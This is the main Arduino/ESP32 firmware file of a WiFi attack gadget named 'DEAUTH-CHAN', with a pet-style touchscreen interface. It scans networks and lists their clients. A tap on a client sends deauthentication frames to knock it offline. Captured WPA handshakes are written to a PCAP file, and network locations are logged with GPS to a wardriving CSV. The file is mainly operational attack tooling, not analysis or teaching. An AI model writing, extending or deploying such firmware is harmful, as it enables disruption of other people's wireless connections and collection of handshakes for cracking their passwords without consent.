#include <Arduino.h>
#include <TFT_eSPI.h>
#include <XPT2046_Touchscreen.h>
#include <SD.h>
#include "config.h"
#include "Mascota.h"
#include "WiFiHunter.h"
#include "PCAPWriter.h"
#include "GPSModule.h"

TFT_eSPI tft = TFT_eSPI();
XPT2046_Touchscreen touch(TOUCH_CS, TOUCH_IRQ);

Mascota mascota;
WiFiHunter hunter;
PCAPWriter pcap;
GPSModule gps;

RedInfo redes[20];
int numRedes = 0;
unsigned long lastScanTime = 0;

bool scanning = false;
unsigned long scanStartTime = 0;

int redSeleccionada = -1;
bool atacando = false;
unsigned long ataqueStartTime = 0;

ClienteInfo clientes[MAX_CLIENTES];
int numClientes = 0;
bool escaneandoClientes = false;
unsigned long clientScanStart = 0;
uint8_t bssidObjetivo[6];

enum ModoUI {
    MODO_REDES,
    MODO_CLIENTES
};
ModoUI modoActual = MODO_REDES;

void onHandshakeCaptured(const uint8_t* frame, uint32_t len) {
    uint32_t ts = millis();
    pcap.writePacket(frame, len, ts/1000, (ts%1000)*1000);
    mascota.incrementarHandshakes();
    Serial.printf("Handshake capturado! %d bytes\n", len);
}

void setup() {
    Serial.begin(115200);
    delay(1000);
    Serial.println("DEAUTH-CHAN v1.0");
    
    pinMode(TFT_LED_PIN, OUTPUT);
    digitalWrite(TFT_LED_PIN, HIGH);
    
    tft.init();
    tft.setRotation(0);
    tft.fillScreen(TFT_BLACK);
    
    touch.begin();
    mascota.init(&tft);
    
    if (pcap.begin("deauth")) {
        Serial.println("PCAP iniciado");
    }
    
    gps.begin();
    hunter.begin();
    hunter.setHandshakeCallback(onHandshakeCaptured);
    
    Serial.println("Setup completado");
}

void dibujarListaRedes() {
    tft.fillRect(0, 200, 240, 120, TFT_BLACK);
    tft.setTextColor(TFT_WHITE);
    tft.setTextSize(1);
    
    int maxMostrar = (numRedes < 6) ? numRedes : 6;
    for (int i = 0; i < maxMostrar; i++) {
        tft.setCursor(5, 205 + i * 20);
        tft.printf("%d. %s (CH%d, %ddBm)", i+1, redes[i].ssid, redes[i].canal, redes[i].rssi);
    }
}

void dibujarListaClientes() {
    tft.fillRect(0, 100, 240, 220, TFT_BLACK);
    tft.setTextColor(TFT_WHITE);
    tft.setTextSize(1);
    
    tft.setCursor(5, 105);
    tft.printf("Clientes en red %d:", redSeleccionada + 1);
    
    int maxMostrar = (numClientes < 10) ? numClientes : 10;
    for (int i = 0; i < maxMostrar; i++) {
        tft.setCursor(5, 125 + i * 20);
        tft.printf("%d. %02X:%02X:%02X:%02X:%02X:%02X (%ddBm)", 
            i+1,
            clientes[i].mac[0], clientes[i].mac[1], clientes[i].mac[2],
            clientes[i].mac[3], clientes[i].mac[4], clientes[i].mac[5],
            clientes[i].rssi);
    }
}

void loop() {
    gps.update();
    hunter.processPendingHandshakes();
    mascota.update();
    mascota.dibujar();
    
    if (modoActual == MODO_REDES) {
        dibujarListaRedes();
    } else if (modoActual == MODO_CLIENTES) {
        dibujarListaClientes();
    }
    
    if (touch.touched()) {
        TS_Point p = touch.getPoint();
        int x = map(p.x, 0, 4095, 0, 240);
        int y = map(p.y, 0, 4095, 0, 320);
        
        if (modoActual == MODO_REDES && y > 200) {
            int indice = (y - 200) / 20;
            if (indice < numRedes) {
                redSeleccionada = indice;
                memcpy(bssidObjetivo, redes[redSeleccionada].bssid, 6);
                
                // Escanear clientes de esta red
                escaneandoClientes = true;
                clientScanStart = millis();
                modoActual = MODO_CLIENTES;
                mascota.setEstado(ESTADO_SCANNING);
                
                // Iniciar escaneo de clientes
                hunter.scanClients(bssidObjetivo, redes[redSeleccionada].canal, 
                                   clientes, MAX_CLIENTES, numClientes);
                
                mascota.setEstado(ESTADO_IDLE);
                escaneandoClientes = false;
            }
        } else if (modoActual == MODO_CLIENTES && y > 100) {
            int indice = (y - 125) / 20;
            if (indice < numClientes) {
                // Atacar cliente específico
                mascota.setEstado(ESTADO_ATTACK);
                hunter.deauth(redes[redSeleccionada], clientes[indice].mac, 30);
                delay(100);
                mascota.setEstado(ESTADO_IDLE);
            }
        } else if (y < 100) {
            // Tocar la mascota para volver a modo redes
            if (modoActual == MODO_CLIENTES) {
                modoActual = MODO_REDES;
                mascota.setEstado(ESTADO_HAPPY);
            } else {
                mascota.tocar(x, y);
            }
        } else {
            mascota.tocar(x, y);
        }
    }
    
    if (!scanning && millis() - lastScanTime > SCAN_INTERVAL && modoActual == MODO_REDES) {
        mascota.setEstado(ESTADO_SCANNING);
        hunter.startScan();
        scanning = true;
        scanStartTime = millis();
    }
    
    if (scanning && hunter.isScanDone()) {
        hunter.getScanResults(redes, 20, numRedes);
        mascota.setRedesEncontradas(numRedes);
        
        GPSData pos = gps.getData();
        File csv = SD.open("/wardriving.csv", FILE_APPEND);
        if (csv) {
            for (int i = 0; i < numRedes; i++) {
                csv.printf("%s,%s,%02X:%02X:%02X:%02X:%02X:%02X,%d,%d,%.6f,%.6f,%.1f\n",
                    pos.valid ? pos.timestamp : "NO_FIX",
                    redes[i].ssid,
                    redes[i].bssid[0], redes[i].bssid[1], redes[i].bssid[2],
                    redes[i].bssid[3], redes[i].bssid[4], redes[i].bssid[5],
                    redes[i].rssi,
                    redes[i].canal,
                    pos.lat,
                    pos.lng,
                    pos.altitude
                );
            }
            csv.close();
        }
        
        mascota.setEstado(ESTADO_IDLE);
        scanning = false;
        lastScanTime = millis();
        Serial.printf("Escaneo completado: %d redes\n", numRedes);
    }
    
    delay(10);
}
